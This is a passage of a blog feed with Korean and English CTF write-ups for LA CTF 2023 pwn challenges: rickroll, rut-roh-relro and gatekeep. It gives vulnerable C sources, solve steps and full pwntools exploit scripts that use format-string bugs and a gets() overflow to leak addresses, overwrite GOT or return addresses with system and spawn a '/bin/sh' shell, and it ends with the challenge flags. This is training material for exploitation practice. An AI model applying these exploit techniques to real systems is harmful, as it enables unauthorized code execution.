class="line">ret = <span class="number">0x401016</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;may i have the flag?\x00&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">64</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0x404068</span>)</span><br><span class="line"><span class="comment"># payload += p64(ret)</span></span><br><span class="line">payload += p64(e.plt[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0x404068</span>)</span><br><span class="line"><span class="comment"># payload += p64(ret)</span></span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf&#123;hey_stop_bullying_my_bot_thats_not_nice&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> La </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>La CTF 2023 - rickroll (FSB)</title>
      <link href="/230215-lactf2023-rickroll/"/>
      <url>/230215-lactf2023-rickroll/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1732">https://ctftime.org/event/1732</a></li></ul><blockquote><p>Make your own custom rickroll with my new rickroll program!<br><code>nc lac.tf 31135</code></p></blockquote><ul><li>[90 solves &#x2F; 449 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> main_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (main_called) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;nice try&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    main_called = <span class="number">1</span>;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Lyrics: &quot;</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">256</span>];</span><br><span class="line">    fgets(buf, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Never gonna give you up, never gonna let you down\nNever gonna run around and &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Never gonna make you cry, never gonna say goodbye\nNever gonna tell a lie and hurt you\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>소스코드가 간단하다. fsb가 터진다. 다만 익스할 때 주의해야 할 점은 main을 다시 실행시킬 때 <code>main_called</code>을 다시 0으로 세팅해줘야 한다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li><code>main_called</code>을 0으로 세팅하고 <code>puts@got</code>를 <code>main</code>으로 overwrite -&gt; <code>main_called</code>만 0으로 세팅해준다면 이제 계속 main이 반복해서 실행됨</li><li>libc leak 및 <code>main_called</code>을 0으로 세팅 </li><li><code>main_called</code>을 0으로 세팅하고 <code>printf@got</code>을 <code>system</code>로 overwrie </li><li>‘&#x2F;bin&#x2F;sh\x00’을 입력</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./rickroll&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;lac.tf&#x27;</span>, <span class="number">31135</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./rickroll&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(1, 80):</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># offset 6</span></span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += fmtstr_payload(<span class="number">6</span>, &#123;</span><br><span class="line">        e.sym[<span class="string">&#x27;main_called&#x27;</span>] : p8(<span class="number">0</span>),</span><br><span class="line">        e.got[<span class="string">&#x27;puts&#x27;</span>] : e.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;cs:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    i = <span class="number">11</span></span><br><span class="line">    info(<span class="built_in">hex</span>(i))</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span> </span><br><span class="line">    payload += <span class="string">b&#x27;%8$hhn__&#x27;</span> <span class="comment"># 6</span></span><br><span class="line">    payload += <span class="string">b&#x27;%11$p&#x27;</span> <span class="comment">#+ i.to_bytes(1, &#x27;big&#x27;) + b&#x27;$p&#x27;    # 7 16</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">16</span>-<span class="built_in">len</span>(payload)) <span class="comment"># padding</span></span><br><span class="line">    payload += p64(e.sym[<span class="string">&#x27;main_called&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    pause()</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;cs:&#x27;</span>, payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;0x&#x27;</span>, timeout = <span class="number">0.5</span>)</span><br><span class="line">    libc.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x53d9b</span></span><br><span class="line">    info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += fmtstr_payload(<span class="number">6</span>, &#123;</span><br><span class="line">        e.sym[<span class="string">&#x27;main_called&#x27;</span>] : p8(<span class="number">0</span>),</span><br><span class="line">        e.got[<span class="string">&#x27;printf&#x27;</span>] : libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    pause()</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;cs:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;cs:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">    <span class="built_in">print</span>(ex)</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="comment"># p = process(&#x27;./rickroll&#x27;)</span></span><br><span class="line">    p = remote(<span class="string">&#x27;lac.tf&#x27;</span>, <span class="number">31135</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>도커파일이 제공되었음에도 로컬과 리모트 환경을 똑같이 맞춰주지 않고 로컬에서 먼저 쉘을 획득하고 리모트를 실행했. 당연히 실패했다. ㅋ 그래서 대충 브포로 leak 오프셋 맞춰주려고 했는데 잘 안되어서 그냥 patchelf 해줘서 문제를 풀었던 기억이 난다. </p><p>도커파일이 제공되면.. 환경부터 맞춰주는게 덜 귀찮은 것을 깨달았다.</p><p>그리고 <code>fmtstr_payload</code>은 동시에 여러개 덮을 수 있다는 점과 payload를 구성할 때 저 함수만 단독으로 써줘야하는 것을 깨달았다.</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf&#123;printf_gave_me_up_and_let_me_down&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> La </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>La CTF 2023 - rut-roh-relro (RELRO)</title>
      <link href="/230215-lactf2023-rut-roh-relro/"/>
      <url>/230215-lactf2023-rut-roh-relro/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1732">https://ctftime.org/event/1732</a></li></ul><blockquote><p>My friend keeps writing super insecure C programs but I’m too lazy to fix his code. I’m sure it’ll be fine as long as I use enough exploit mitigations, right?<br><code>nc lac.tf 31180</code></p></blockquote><ul><li>[70 solves &#x2F; 462 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>Full Relro!! NX and PIE are enabled.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What would you like to post?&quot;</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">512</span>];</span><br><span class="line">    fgets(buf, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Here&#x27;s your latest post:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWhat would you like to post?\n&quot;</span>);</span><br><span class="line">    fgets(buf, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nYour free trial has expired. Bye!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>You can find twice fsb.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li>leak libc, stack, pie &#x2F; <code>ret2main</code> (Overwrite the ret in stack to <code>main</code>)</li><li>Overwrite the ret in stack to <code>system</code> &#x2F; Overwrite the <code>rdi</code> to ‘&#x2F;bin&#x2F;sh\x00’</li></ol><p>The <code>rdi</code> is in the writeable space. You know the libc address. Got the offset during debugging and overwrite it.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./rut_roh_relro&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;lac.tf&#x27;</span>, <span class="number">31134</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./rut_roh_relro&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc,stack,pie</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%71$p%68$p%63$p&#x27;</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x23d0a</span></span><br><span class="line">info(<span class="string">&#x27;libc address &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;stack &#x27;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line">ret = stack - <span class="number">0xe8</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x1265</span></span><br><span class="line">info(<span class="string">&#x27;pie address &#x27;</span> + <span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># og = [0xc961a, 0xc961d, 0xc9620]</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">6</span>, &#123;ret : e.symbols[<span class="string">&#x27;main&#x27;</span>]&#125;)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">###### (2) ######</span></span><br><span class="line">ret = stack - <span class="number">0xe0</span></span><br><span class="line">rdi = libc.address + <span class="number">0x1d1990</span></span><br><span class="line">info(<span class="built_in">hex</span>(ret))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">6</span>, &#123;ret : libc.symbols[<span class="string">&#x27;system&#x27;</span>]&#125;)</span><br><span class="line">payload += <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">6</span>, &#123;rdi : <span class="string">b&#x27;/bin/sh\x00&#x27;</span>&#125;)</span><br><span class="line">payload += <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>I want to use the one gadget, but I can’t. :( I have no choice to do honestly. Run the <code>system(&#39;/bin/sh\x00&#39;)</code> :).</p><p>But Some people use that gadget.. good.</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf&#123;maybe_ill_add_asan_for_good_measure&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> La </category>
          
      </categories>
      
      
        <tags>
            
            <tag> relro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>La CTF 2023 - gatekeep</title>
      <link href="/230214-lactf2023-gatekeep/"/>
      <url>/230214-lactf2023-gatekeep/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1732">https://ctftime.org/event/1732</a></li></ul><p>pwnable 문제도 많고 너무 재밌는 씨텝이었다. 내가 봤던 문제들에는 도커파일과 소스코드를 제공해주었다.</p><blockquote><p>If I gaslight you enough, you won’t be able to get my flag! :)<br><code>nc lac.tf 31121</code></p></blockquote><ul><li>[529 solves &#x2F; 138 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>친절하게</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_flag</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">    FILE* flagfile = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (flagfile == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Cannot read flag.txt.&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        fgets(flag, <span class="number">256</span>, flagfile);</span><br><span class="line">        flag[<span class="built_in">strcspn</span>(flag, <span class="string">&quot;\n&quot;</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="built_in">puts</span>(flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">check</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> input[<span class="number">15</span>];</span><br><span class="line">    <span class="type">char</span> pass[<span class="number">10</span>];</span><br><span class="line">    <span class="type">int</span> access = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If my password is random, I can gatekeep my flag! :)</span></span><br><span class="line">    <span class="type">int</span> data = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (data &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Can&#x27;t access /dev/urandom.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ssize_t</span> result = read(data, pass, <span class="keyword">sizeof</span> pass);</span><br><span class="line">        <span class="keyword">if</span> (result &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Data not received from /dev/urandom\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    close(data);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Password:\n&quot;</span>);</span><br><span class="line">    gets(input); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(input, pass)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I swore that was the right password ...\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        access = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(access) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Guess I couldn&#x27;t gaslight you!\n&quot;</span>);</span><br><span class="line">        print_flag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;If I gaslight you enough, you won&#x27;t be able to guess my password! :)\n&quot;</span>);</span><br><span class="line">    check();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gets</code> 함수는 BOF가 일어날 가능성이 존재한다. <code>/dev/urandom</code>에서 읽어온 값은 값을 leak하는 거 아닌 이상 정확한 값을 알 수가 없기 때문에 <code>strcmp(input, pass)</code>을 우회하여 <code>access</code>를 1로 세팅해줘야하는 방법을 생각해야 한다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p><code>a</code>를 많이 보내주니 <code>print_flag</code> 함수가 실행되어 플래그를 획득할 수 있었다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[jir4vvit@arch gatekeep]$ nc lac.tf 31121</span><br><span class="line">aIf I gaslight you enough, you won&#x27;t be able to guess my password! :)</span><br><span class="line">Password:</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">I swore that was the right password ...</span><br><span class="line">Guess I couldn&#x27;t gaslight you!</span><br><span class="line">lactf&#123;sCr3am1nG_cRy1Ng_tHr0w1ng_uP&#125;</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf&#123;sCr3am1nG_cRy1Ng_tHr0w1ng_uP&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> La </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>(author) Winter HackingCamp CTF 2023 - syscall (SROP)</title>
      <link href="/230211-hcamp2023w-syscall/"/>
      <url>/230211-hcamp2023w-syscall/</url>
      
